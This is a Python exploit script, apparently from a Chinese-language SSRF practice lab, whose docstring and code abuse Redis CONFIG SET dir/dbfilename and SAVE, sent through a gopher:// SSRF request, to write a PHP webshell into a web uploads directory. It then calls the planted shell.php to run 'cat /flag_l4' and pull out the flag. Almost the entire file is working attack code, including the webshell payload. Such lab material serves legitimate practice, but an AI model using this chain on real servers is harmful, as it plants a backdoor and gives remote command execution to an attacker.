"""L4 · 同一个洞，把「读」换成「写」

Redis 有两个配置项天生就是用来写文件的：
    CONFIG SET dir /var/www/html/uploads
    CONFIG SET dbfilename shell.php
    SET payload "<?php system($_GET[0]); ?>"
    SAVE

SAVE 会把内存快照写到 dir/dbfilename，于是 RDB 文件就变成了 webshell。
RDB 前面有一堆二进制垃圾，但 PHP 只在 <?php 之后开始解析，不影响执行。

注意 Redis 7 把 dir / dbfilename 归为 protected config，默认禁止 CONFIG SET。
靶场启动时加了 --enable-protected-configs yes 来还原老版本的行为。

跑法：
    python3 04_redis_webshell.py
"""

import sys
import urllib.parse
import urllib.request

from _util import API, find_flag, gopher_url, report, send

PHP = "<?php system($_GET[0]); ?>"


def resp(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        b = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(b), b)
    return out


def main():
    payload = (
        resp("CONFIG", "SET", "dir", "/var/www/html/uploads")
        + resp("CONFIG", "SET", "dbfilename", "shell.php")
        + resp("SET", "payload", PHP)
        + resp("SAVE")
        + resp("QUIT")
    )

    print("=== 写入 ===")
    body = send("l4.php", gopher_url("redis", 6379, payload))
    print(body.strip())
    if "+OK" not in body:
        print("[-] 写入没成功，看看返回的 -ERR", file=sys.stderr)
        return 1

    print("\n=== 执行 shell ===")
    shell = API + "/uploads/shell.php?0=" + urllib.parse.quote("cat /flag_l4")
    with urllib.request.urlopen(shell, timeout=10) as r:
        out = r.read().decode("utf-8", "replace")

    # 响应里混着 RDB 的二进制垃圾，只把 flag 挑出来。
    # 注意取最后一个：RDB 里带着 L3 的 l3_flag 明文，system() 的输出在末尾。
    f = find_flag(out, last=True)
    if f:
        print("[+] flag:", f)
        return 0
    print(out[-400:], file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
